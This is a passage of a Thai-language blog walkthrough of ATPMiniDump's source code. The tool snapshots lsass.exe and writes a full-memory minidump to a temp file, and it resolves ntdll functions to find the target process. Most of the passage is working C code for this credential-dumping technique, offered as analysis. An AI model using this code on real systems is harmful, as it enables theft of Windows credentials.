<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_MINIDUMP_CALLBACK_INFORMATION</span> {
  MINIDUMP_CALLBACK_ROUTINE CallbackRoutine;
  PVOID                     CallbackParam;
} MINIDUMP_CALLBACK_INFORMATION, <span style="color:#f92672">*</span>PMINIDUMP_CALLBACK_INFORMATION;
</code></pre></div><p>อ้างอิงจากเอกสารของไมโครซอฟต์ <code>MINIDUMP_CALLBACK_INFORMATION</code> มีความเกี่ยวข้องฟังก์ชัน <code>MiniDumpWriteDump()</code> ซึ่งสามารถใช้เพื่อทำการสร้างไฟล์ที่มีข้อมูลของ minidump ได้ เราจึงสามารถคาดเดาจุดประสงค์ของสิ่งที่จะเกิดขึ้นต่อไปได้ว่าโค้ดอาจพยายามที่จะสร้างไฟล์ minidump จากข้อมูลซึ่งถูกชี้โดย <code>snapshotHandle</code></p>
<p>จากโครงสร้างของ <code>MINIDUMP_CALLBACK_INFORMATION</code> โค้ดในส่วนถัดมาหลังจากการเรียกใช้ฟังก์ชัน <code>ZeroMemory()</code> จะแสดงให้เห็นถึงการกำหนดให้กับสมาชิกในโครงสร้างโดยมีการกำหนดให้ <code>CallbackInfo.CallbackRoutine</code> มีค่าเป็น <code>ATPMiniDumpWriteDumpCallBack</code> และค่า <code>CallbackInfo.CallbackParam</code> มีค่าเป็น <code>NULL</code></p>
<p>เราจะเห็นการกำหนด <code>ATPMiniDumpWriteDumpCallback</code> ในลักษณะของ callback ที่<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L301">บรรทัดที่ 301</a> ตามโค้ดด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">BOOL CALLBACK <span style="color:#a6e22e">ATPMiniDumpWriteDumpCallback</span>(
	__in     PVOID CallbackParam,
	__in     <span style="color:#66d9ef">const</span> PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	<span style="color:#66d9ef">switch</span> (CallbackInput<span style="color:#f92672">-&gt;</span>CallbackType)
	{
	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span> <span style="color:#75715e">// IsProcessSnapshotCallback
</span><span style="color:#75715e"></span>		CallbackOutput<span style="color:#f92672">-&gt;</span>Status <span style="color:#f92672">=</span> S_FALSE;
		<span style="color:#66d9ef">break</span>;
	}
	<span style="color:#66d9ef">return</span> TRUE;
}
</code></pre></div><p>Callback คือลักษณะของฟังก์ชันซึ่งจะถูกเรียกใช้เมื่อเกิดเหตุการณ์หนึ่งขึ้นมา โดยการเรียกใช้ callback จะต้องมีการ register หรือ &ldquo;ผูก&rdquo; มันไว้ก่อนซึ่งในบางครั้งก็ทำได้โดยการระบุชื่อของฟังก์ชัน callback ไปเป็นอากิวเมนต์ ในกรณีนี้การระบุ <code>ATPMiniDumpWriteDumpCallBack</code> ไว้ให้กับ <code>CalbackInfo.CallbackRoutine</code> อาจแสดงให้เห็นถึงการ register ฟังก์ชัน callback เอาไว้ใช้ภายหลัง</p>
<p>จนถึงจุดนี้ หากฟังก์ชันทำงานจนเสร็จสิ้นและโปรแกรมไม่ได้มีการหยุดการทำงาน กระบวนการในขั้นที่มีการเข้าถึงหน่วยความจำของโปรเซส <code>lsass.exe</code> และทำ snapshot ด้วยฟังก์ชัน <code>PssCaptureSnapshot</code> ก็ถือได้ว่าเสร็จสิ้น ในส่วนต่อไป ฟังก์ชัน <code>wmain()</code> จะดำเนินการในขั้นตอนสุดท้ายคือการเรียกใช้ฟังก์ชัน <code>MiniDumpWriteDump()</code> เพื่อสร้างไฟล์จากข้อมูล snapshot</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[3] Create memorydump file:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

WCHAR chDmpFile[MAX_PATH] <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">??</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>;
WCHAR chWinPath[MAX_PATH];
GetWindowsDirectory(chWinPath, MAX_PATH);
wcscat_s(chDmpFile, <span style="color:#66d9ef">sizeof</span>(chDmpFile) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">wchar_t</span>), chWinPath);
wcscat_s(chDmpFile, <span style="color:#66d9ef">sizeof</span>(chDmpFile) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">wchar_t</span>), <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Temp</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">dumpert.dmp&#34;</span>);

UNICODE_STRING uFileName;
RtlInitUnicodeString(<span style="color:#f92672">&amp;</span>uFileName, chDmpFile);
wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Dump %wZ memory to: %wZ</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pWinVerInfo<span style="color:#f92672">-&gt;</span>ProcName, uFileName);
</code></pre></div><p>โค้ดด้านบนแสดงให้เห็นการเตรียมการเพื่อการเขียนไฟล์ โดยมีการสร้างพาธและชื่อไฟล์เพื่อรองรับการสร้างไฟล์เอาไว้</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">HANDLE hDmpFile <span style="color:#f92672">=</span> NULL;

IO_STATUS_BLOCK IoStatusBlock;
ZeroMemory(<span style="color:#f92672">&amp;</span>IoStatusBlock, <span style="color:#66d9ef">sizeof</span>(IoStatusBlock));

OBJECT_ATTRIBUTES FileObjectAttributes;
InitializeObjectAttributes(
  <span style="color:#f92672">&amp;</span>FileObjectAttributes,
  <span style="color:#f92672">&amp;</span>uFileName,
  OBJ_CASE_INSENSITIVE,
  NULL,
  NULL
);

_NtCreateFile NtCreateFile <span style="color:#f92672">=</span> (_NtCreateFile)
  GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;NtCreateFile&#34;</span>);
<span style="color:#66d9ef">if</span> (NtCreateFile <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

_ZwClose ZwClose <span style="color:#f92672">=</span> (_ZwClose)
  GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;ZwClose&#34;</span>);
<span style="color:#66d9ef">if</span> (ZwClose <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

status <span style="color:#f92672">=</span> NtCreateFile(
  <span style="color:#f92672">&amp;</span>hDmpFile, <span style="color:#75715e">// FileHandle
</span><span style="color:#75715e"></span>  FILE_GENERIC_WRITE, <span style="color:#75715e">// DesiredAccess
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>FileObjectAttributes, <span style="color:#75715e">// ObjectAttributes
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>IoStatusBlock, <span style="color:#75715e">// IoStatusBlock
</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0</span>, <span style="color:#75715e">// AllocationSize
</span><span style="color:#75715e"></span>  FILE_ATTRIBUTE_NORMAL, <span style="color:#75715e">// FileAttributes
</span><span style="color:#75715e"></span>  FILE_SHARE_WRITE, <span style="color:#75715e">// ShareAccess
</span><span style="color:#75715e"></span>  FILE_OVERWRITE_IF, <span style="color:#75715e">// CreateDisposition
</span><span style="color:#75715e"></span>  FILE_SYNCHRONOUS_IO_NONALERT, <span style="color:#75715e">// CreateOptions
</span><span style="color:#75715e"></span>  NULL, <span style="color:#75715e">//EaBuffer
</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0</span> <span style="color:#75715e">// EaLength
</span><span style="color:#75715e"></span>);

<span style="color:#66d9ef">if</span> (hDmpFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] Failed to create dumpfile.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  ZwClose(hProcess);
  exit(<span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>โค้ดด้านบนหากอ่านจากข้างล่างขึ้นข้างบนอาจช่วยให้เข้าใจที่มาและที่ไปได้ดีมากกว่า จุดประสงค์ของโค้ดยาวๆ ข้างบนนั้นไม่ได้มีอะไรไปมากกว่าการสร้างไฟล์เปล่าขึ้นมาเตรียมเอาไว้เพื่อรอการเขียนข้อมูลจากฟังก์ชัน <code>MiniDumpWriteDump()</code> ด้วยฟังก์ชัน <code>NtCreateFile()</code> ซึ่งมีฟังก์ชัน <code>ZwClose()</code> ติดมาด้วยกรณีที่เกิดข้อผิดพลาดหรือฟังก์ชันทำงานจนเสร็จสิ้นก็จะสามารถใช้ฟังก์ชัน <code>ZwClose()</code> ในการทำลาย handle ที่ค้างอยู่ได้ เนื่องจากทั้ง 2 ฟังก์ชันนี้มีอยู่ในไลบรารี <code>ntdll.dll</code> การสร้าง function pointer ซึ่งชี้ไปยัง 2 ฟังก์ชันนี้จึงจำเป็นต้องมีการทำก่อนเรียกใช้</p>
<p>เพื่อที่จะสร้างไฟล์เปล่าด้วยฟังก์ชัน <code>NtCreateFile()</code> เราจำเป็นต้องเตรียมและเติมค่าในอากิวเมนต์ให้กับฟังก์ชันนี้ให้เต็มก่อน เราจึงเห็นกระบวนการเตรียมในแต่ละส่วนได้ดังนี้</p>
<ul>
<li>พารามิเตอร์ <code>FileHandle</code> ซึ่งในที่นี้คือ <code>&amp;hDmpFile</code> คือ file handle สำหรับไฟล์ที่สร้างใหม่ การดำเนินการใดๆ กับไฟล์ไม่ว่าจะเป็นการเขียนหรือแก้ไขก็จำเป็นที่จะต้องใช้ file handle นี้ในการอ้างถึง เราเห็นการสร้าง <code>hDmpFile</code> และกำหนดค่าให้เป็น <code>NULL</code> ในส่วนแรก</li>
<li>พารามิเตอร์ <code>DesiredAccess</code> ซึ่งในที่นี้คือ <code>FILE_GENERIC_WRITE</code> เป็นการระบุสิทธิ์ในการเข้าถึง โดยสิทธิ์ที่มีการระบุนี้นั้นเป็นการระบุที่บ่งชี้ให้เห็นถึงการเปิดไฟล์เพื่อเขียน</li>
<li>พารามิเตอร์ <code>ObjectAttributes</code> ซึ่งในที่นี้คือ <code>&amp;FileObjectAttributes</code> ถูกระบุไปยังตำแหน่งในหน่วยความจำของ <code>FileObjectAttributes</code> โดยตัวแปรดังกล่าวมีไว้เพื่อกำหนดคุณลักษณะของ <a href="https://docs.microsoft.com/en-us/windows/win32/sysinfo/kernel-objects">kernel object</a></li>
<li>พารามิเตอร์ <code>IoStatusBlock</code> ซึ่งในที่นี้คือ <code>&amp;IoStatusBlock</code> คือพอยน์เตอร์ซึ่งชี้ไปยังตำแหน่งในหน่วยความจำสำหรับการรับสถานะการทำงานเมื่อมีการดำเนินการเสร็จ โดยในกรณีของฟังก์ชัน <code>NtCreateFile()</code> นั้น ค่าใน <code>IoStatusBlock</code> อาจมีได้ อาทิ <code>FILE_CREATED</code> หรือ <code>FILE_OPENED</code> เป็นต้น ตัวแปร <code>IoStatusBlock</code> ได้ถูกสร้างจาก <code>IO_STATUS_BLOCK</code> และผ่านฟังก์ชัน <code>ZeroMemory()</code> เป็นที่เรียบร้อยแล้ว</li>
<li>ค่า <code>0</code> ในตำแหน่ง <code>AllocationSize</code> ใช้ระบุขนาดในหน่วยของไบต์ของไฟล์ที่จะสร้างขึ้น</li>
<li>พารามิเตอร์ <code>FileAttributes</code> ซึ่งในที่นี้คือ <code>FILE_ATTRIBUTE_NORMAL</code> คือการระบุคุณลักษณะของไฟล์ซึ่งสามารถดูเพิ่มเติมได้ที่ <a href="https://docs.microsoft.com/en-us/windows/win32/fileio/file-attribute-constants">File Attribute Constants</a></li>
<li>พารามิเตอร์ <code>ShareAccess</code> ซึ่งในที่นี้คือ <code>FILE_SHARE_WRITE</code> คือการระบุลักษณะและขอบเขตในการแบ่งปันการเข้าถึง</li>
<li>พารามิเตอร์ <code>CreateDisposition</code> ซึ่งในที่นี้คือ <code>FILE_OVERWRITE_IF</code> คือการระบุลักษณะในการดำเนินการกับไฟล์ โดยในกรณีนี้นั้น <code>FILE_OVERWRITE_IF</code> หมายถึงถ้ามีไฟล์ในชื่อเดียวกันถูกสร้างขึ้นมาแล้ว ให้ทำการเปิดและเขียนทับไฟล์ดังกล่าวทันที แต่หากยังไม่มีไฟล์ดังกล่าว ให้ทำการสร้างไฟล์ใหม่ตามคุณลักษณะที่ได้ดำเนินเอาไว้</li>
<li>พารามิเตอร์ <code>CreateOptions</code> ซึ่งในที่นี้คือ <code>FILE_SYNCHRONOUS_IO_NONALERT</code> เป็นหนึ่งในออปชั่นอื่นๆ ที่เกี่ยวข้องกับการสร้างไฟล์และเข้าถึงไฟล์ โดย <code>FILE_SYNCHRONOUS_IO_NONALERT</code> หมายถึงให้ดำเนินการใดๆ กับไฟล์ถูก sychronize และจัดการโดยระบบที่มีการทำ I/O queue เอาไว้</li>
<li>ส่วน <code>NULL</code> ของ <code>EaBuffer</code> และ 0 ของ <code>EaLength</code> ใช้สำหรับระบุคุณลักษณะเพิ่มเติม (extended attributes) ให้กับไฟล์</li>
</ul>
<p>โค้ดส่วนสุดท้ายด้านล่างจะแสดงให้เห็นถึงการเรียกใช้ฟังก์ชัน <code>MiniDumpWriteDump()</code> ในการเขียนข้อมูลจาก <code>snapshotHandle</code> ซึ่งเป็นผลมาจากการใช้ฟังก์ชัน <code>PssCaptureSnapshot()</code> ลงไปที่ <code>hDmpFile</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">BOOL Success <span style="color:#f92672">=</span> MiniDumpWriteDump(
  snapshotHandle, <span style="color:#75715e">// hProcess
</span><span style="color:#75715e"></span>  dwTargetPID, <span style="color:#75715e">// ProcessId
</span><span style="color:#75715e"></span>  hDmpFile, <span style="color:#75715e">// hDmpFile
</span><span style="color:#75715e"></span>  MiniDumpWithFullMemory, <span style="color:#75715e">// DumpType
</span><span style="color:#75715e"></span>  NULL, <span style="color:#75715e">// ExceptionParam
</span><span style="color:#75715e"></span>  NULL, <span style="color:#75715e">// UserStreamParam
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>CallbackInfo <span style="color:#75715e">// CallbackParam
</span><span style="color:#75715e"></span>  );
<span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>Success))
{
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] Failed to create minidump, error code: %x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
}
<span style="color:#66d9ef">else</span> {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[+] Dump succesful.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

ZwClose(hDmpFile);
ZwClose(hProcess);

<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</code></pre></div><p>จุดที่น่าสนใจในการเรียกใช้ฟังก์ชัน <code>MiniDumpWriteDump()</code> คือพารามิเตอร์ <code>DumpType</code> ซึ่งมีการระบุ flag เอาไว้เป็น <code>MiniDumpWithFullMemory</code> ซึ่งหมายถึงการให้สร้าง minidump จากข้อมูลทุกส่วน ไม่ใช่เพียงแค่ส่วนโค้ดหรือส่วนข้อมูลปลีกย่อย</p>
<p>อีกจุดหนึ่งที่น่าสนใจคือหน้าที่ของพารามิเตอร์ <code>CallbackParam</code> ซึ่งในที่นี้คือ <code>CallbackInfo</code> หากเราดูที่เนื้อหาของโค้ดในฟังก์ชัน callback อย่าง <code>ATPMiniDumpWRiteDumpCallBack</code> ก็จะสามารถอธิบายได้ว่า <code>CallbackInfo</code> ถูกระบุเพื่อให้รับข้อมูลเพื่อเติมจากกระบวนการทำ minidump</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">BOOL CALLBACK <span style="color:#a6e22e">ATPMiniDumpWriteDumpCallback</span>(
	__in     PVOID CallbackParam,
	__in     <span style="color:#66d9ef">const</span> PMINIDUMP_CALLBACK_INPUT CallbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
	<span style="color:#66d9ef">switch</span> (CallbackInput<span style="color:#f92672">-&gt;</span>CallbackType)
	{
	<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">16</span><span style="color:#f92672">:</span> <span style="color:#75715e">// IsProcessSnapshotCallback
</span><span style="color:#75715e"></span>		CallbackOutput<span style="color:#f92672">-&gt;</span>Status <span style="color:#f92672">=</span> S_FALSE;
		<span style="color:#66d9ef">break</span>;
	}
	<span style="color:#66d9ef">return</span> TRUE;
}
</code></pre></div><p>เมื่อฟังก์ชัน <code>MiniDumpWriteDump()</code> เรียกใช้ฟังก์ชัน <code>ATPMiniDumpWriteDumpCallback()</code> ฟังก์ชัน <code>MiniDumpWriteDump()</code> จะมีการส่งข้อมูลกลับมาในส่วนที่เป็น <code>CallbackParam</code> และ <code>CallbackInput</code> โดย <code>CallbackParam</code> จะเป็นส่วนที่แอปพลิเคชันหรือโปรแกรมกำหนดขึ้นมาเอง แต่ <code>CallbackInput</code> นั้นจะมีโครงสร้าง <code>MINIDUMP_CALLBACK_INPUT</code> ที่ระบบกำหนดมาให้ตามที่ระบุไว้ใน<a href="https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/ns-minidumpapiset-minidump_callback_input">เอกสารของไมโครซอฟต์</a></p>
<p>สิ่งที่ฟังก์ชัน <code>ATPMiniDumpWRiteDumpCallback()</code> ทำนั้นคือการระบุกลับไปยังฟังก์ชัน <code>MiniDumpWriteDump()</code> ว่า minidump ที่ถูกสร้างขึ้นนั้นมาจาก snapshot โดยอาศัยการกำหนดค่าใน <code>CallbackInput.CallbackType</code> ที่ 16 ซึ่งเป็นส่วนของ flag ชื่อ <code>IsProcessSnapshotCallback</code> ให้เป็น <code>S_FALSE</code> ใน <code>CallbackInput.CallbackType</code> (ดูเพิ่มเติม <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/proc_snap/export-a-process-snapshot-to-a-file">Generate Dump File from a Process Snapshot</a>)</p>
<p>หลังจากเสร็จสิ้นกระบวนการทั้งหมดและไฟล์ถูกสร้างขึ้นพร้อมกับข้อมูลของ snapshot จากโปรเซส <code>lsass.exe</code> ทั้ง file handle และ process handle ก็จะถูกทำลายด้วยฟังก์ชัน <code>ZwClose()</code> เป็นอันจบการทำงานของฟังก์ชัน <code>wmain()</code></p>
<h3 id="getpid-function">GetPID Function</h3>
<blockquote>
<p>ดูโค้ดของฟังก์ชัน <code>GetPID()</code> แบบเต็มได้<a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L16">ที่นี่</a></p>
<p>โค้ดในฟังก์ชัน <code>GetPID()</code> มีการพยายามเรียกใช้ฟังก์ชันซึ่งอยู่ในไลบรารี DLL อื่น แนะนำให้อ่านหัวข้อ <a href="#loading-external-function-with-function-pointer">Loading External Function with Function Pointer</a> เพิ่มเติมเพื่อความเข้าใจที่มากขึ้นครับ</p>
</blockquote>
<p>ฟังก์ชัน <code>GetPID()</code> เป็นฟังก์ชันที่จะส่งออกข้อมูลประเภท <code>BOOL</code> เป็นผลลัพธ์ ฟังก์ชันมีการระบุพารามิเตอร์เอาไว้โดยจะถูกเก็บไว้ในตัวแปร <code>pWinVerInfo</code> ซึ่งเป็นตัวแปรประเภท <code>PWIN_VER_INFO</code> ฟังก์ชัน <code>GetPID()</code> มีการถูกเรียกใช้งานเพียงหนึ่งครั้งจากโค้ดในฟังก์ชัน <code>wmain()</code> <a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.c#L182">บรรทัดที่ 182</a> ตามตัวอย่างด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>GetPID(pWinVerInfo)) {
  wprintf(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;	[!] Enumerating process failed.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  exit(<span style="color:#ae81ff">1</span>);
}
</code></pre></div><p>ผมจะขอยกที่มาของอากิวเมนต์ไว้อธิบายในฟังก์ชัน <code>wmain()</code> ซึ่งเป็นส่วนของโค้ดที่กำหนดขึ้นมา ดังนั้นในการอธิบายฟังก์ชัน <code>GetPID()</code> เราจะสมมติโครงสร้างที่สมบูรณ์ของข้อมูลในประเภท <code>PWIN_VER_INFO</code> ขึ้นมาเพื่อให้เข้าใจการทำงานได้ง่ายขึ้นแทน โดยโครงสร้างของข้อมูลประเภท <code>PWIN_VER_INFO</code> ถูกกำหนดอยู่ในไฟล์ <code>ATPMiniDump.h</code> <a href="https://github.com/b4rtik/ATPMiniDump/blob/master/ATPMiniDump/ATPMiniDump.h#L49">ในบรรทัดที่ 49</a> ตามโครงสร้างด้านล่าง</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_WIN_VER_INFO</span> {
	WCHAR chOSMajorMinor[<span style="color:#ae81ff">8</span>];
	DWORD dwBuildNumber;
	UNICODE_STRING ProcName;
	HANDLE hTargetPID;
	LPCSTR lpApiCall;
	INT SystemCall;
} WIN_VER_INFO, <span style="color:#f92672">*</span>PWIN_VER_INFO;
</code></pre></div><p>จากบทเรียนของเราในเรื่อง typedef (ข้ามไปอ่าน <a href="#loading-external-function-with-function-pointer">Loading External Function with Function Pointer</a> ได้เพื่อความเข้าใจที่มากขึ้น) เราสามารถอธิบายการโค้ดด้านบนได้ดังนี้</p>
<ul>
<li>ทำการสร้างประเภทของข้อมูลใหม่ในชื่อ <code>_WIN_VER_INFO</code> จากประเภทข้อมูลแบบ <code>struct</code></li>
<li>ประเภทข้อมูลนี้จะมีโครงสร้างภายในคือ
<ul>
<li>เก็บค่า <code>chOSMajorMinor</code> แบบ wide character ขนาดอาเรย์ 8 ช่อง</li>
<li>เก็บค่า <code>dwBuildNumber</code> แบบ double word</li>
<li>เก็บค่า <code>ProcName</code> แบบสตริงที่ใช้ Unicode encoding</li>
<li>เก็บค่า <code>hTargetPID</code> ในลักษณะของ handle</li>
<li>เก็บค่า <code>lpApiCall</code> แบบพอยน์เตอร์แบบ 32 บิตซึ่งชี้ไปยังสตริงแบบ constant</li>
<li>เก็บค่า <code>SystemCall</code> แบบจำนวนเต็ม</li>
</ul>
</li>
<li>ชื่อของตัวแปรแบบ struct คือ <code>WIN_VER_INFO</code></li>
<li>ชื่อของพอยน์เตอร์ซึ่งชี้มายัง struct นี้คือ <code>*PWIN_VER_INFO</code></li>
</ul>
<p>ตอนนี้โครงสร้างด้านบนถูกส่งเข้ามาผ่านตัวแปรชื่อ <code>pWinVerInfo</code> ซึ่งมีการตั้งชื่อสมาชิกในโครงสร้างเอาไว้ให้สามารถตีความหมายได้ในตัวอยู่แล้วว่าสมาชิกแต่ละตัวจะเก็บข้อมูลอะไรเอาไว้</p>
<p>เริ่มต้นการทำงาน มีการ initialize ค่าในตัวแปร <code>pWinVerInfo</code> ก่อนหนึ่งครั้งที่ <code>pWinVerInfo.hTargetPID</code> โดยถูกกำหนดให้เป็นค่า <code>NULL</code> จากชื่อของฟังก์ชันหลักคือ <code>GetPID()</code> เราคงพอจะเดากันได้ว่าฟังก์ชันนี้น่าจะพยายามหาค่า <code>PID</code> ของโปรเซสใดโปรเซสหนึ่งซึ่งจะมาถูกเก็บเอาไว้ใน <code>pWinVerInfo.hTargetPID</code> ด้วยเป้าหมายนี้นั้น ลอจิคที่ดูสมเหตุสมผลคือการแสดงรายการของโปรเซสที่มีอยู่ในระบบ ณ ขณะนั้นทั้งหมด แล้วไล่หาค่า PID ด้วยปัจจัยบางอย่างก่อนที่จะนำมาเก็บไว้ที่ตำแหน่งดังกล่าว</p>
<p>หากใครได้อ่านฟังก์ชัน <code>wmain()</code> ก็อาจจะพอปะติดปะต่อได้ว่าตัวแปร <code>pWinVerInfo</code> ซึ่งเป็นค่านำเข้านั้นมีการกำหนดค่าไว้กับสมาชิก <code>pWinVerInfo.ProcName</code> ไว้อยู่แล้วว่าให้เป็นค่าใด ดังนั้นปัจจัยซึ่งจะนำมาใช้หาค่า <code>PID</code> จึงมีความเป็นไปได้สูงว่าจะมีการใช้ <code>pWinVerInfo.ProcName</code> ครับ ส่วนหากใครยังไม่ได้อ่านก็ไม่เป็นไร ยังไปต่อกันได้อยู่ครับ :)</p>
<p>ต่อมามีการใช้ท่า function pointer ในการโหลด 3 ฟังก์ชันกลุ่ม Windows Kernel API มาจาก <code>ntdll.dll</code> โดย 3 ฟังก์ชันนั้นคือ <code>ZwQuerySystemInformation()</code> ซึ่งมักถูกใช้สำหรับหาข้อมูลเกี่ยวกับระบบ, ฟังก์ชัน <code>NtAllocateVirtualMemory()</code> สำหรับการจองพื้นที่ในหน่วยความจำของโปรเซส และฟังก์ชัน <code>NtFreeVirtualMemory()</code> สำหรับการคืนพื้นที่หน่วยความจำที่จองมา</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">_ZwQuerySystemInformation ZwQuerySystemInformation <span style="color:#f92672">=</span> (_ZwQuerySystemInformation) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;ZwQuerySystemInformation&#34;</span>);
<span style="color:#66d9ef">if</span> (ZwQuerySystemInformation <span style="color:#f92672">==</span> NULL) {
		<span style="color:#66d9ef">return</span> FALSE;
}

_NtAllocateVirtualMemory NtAllocateVirtualMemory <span style="color:#f92672">=</span> (_NtAllocateVirtualMemory) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
<span style="color:#66d9ef">if</span> (NtAllocateVirtualMemory <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}

_NtFreeVirtualMemory NtFreeVirtualMemory <span style="color:#f92672">=</span> (_NtFreeVirtualMemory) GetProcAddress(GetModuleHandle(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;ntdll.dll&#34;</span>), <span style="color:#e6db74">&#34;NtFreeVirtualMemory&#34;</span>);
<span style="color:#66d9ef">if</span> (NtFreeVirtualMemory <span style="color:#f92672">==</span> NULL) {
  <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>ฟังก์ชัน <code>ZwQuerySystemInformation()</code> เป็นฟังก์ชันแรกซึ่งถูกเรียกใช้ตามโค้ดด้านล่าง โดยก่อนที่จะมีการเรียกใช้ฟังก์ชันนี้นั้น โค้ดได้มีการสร้างและกำหนดค่าให้กับตัวแปร <code>uReturnLength</code> ซึ่งเป็นตัวแปรประเภท <code>ULONG</code> ให้มีค่าเป็น 0 ด้วย</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">ULONG uReturnLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
NTSTATUS status <span style="color:#f92672">=</span> ZwQuerySystemInformation(
  SystemProcessInformation, <span style="color:#75715e">// SystemInformationClass
</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0</span>, <span style="color:#75715e">// SystemInformation
</span><span style="color:#75715e"></span>  <span style="color:#ae81ff">0</span>, <span style="color:#75715e">// SystemInformationLength
</span><span style="color:#75715e"></span>  <span style="color:#f92672">&amp;</span>uReturnLength <span style="color:#75715e">// ReturnLength
</span><span style="color:#75715e"></span>);
<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc0000004</span>) {
  <span style="color:#66d9ef">return</span> FALSE;
}
</code></pre></div><p>ฟังก์ชัน <code>ZwQuerySystemInformation()</code> มีพารามิเตอร์ทั้งหมด 4 ตัว ซึ่งมีความหมายดังนี้</p>
<ul>
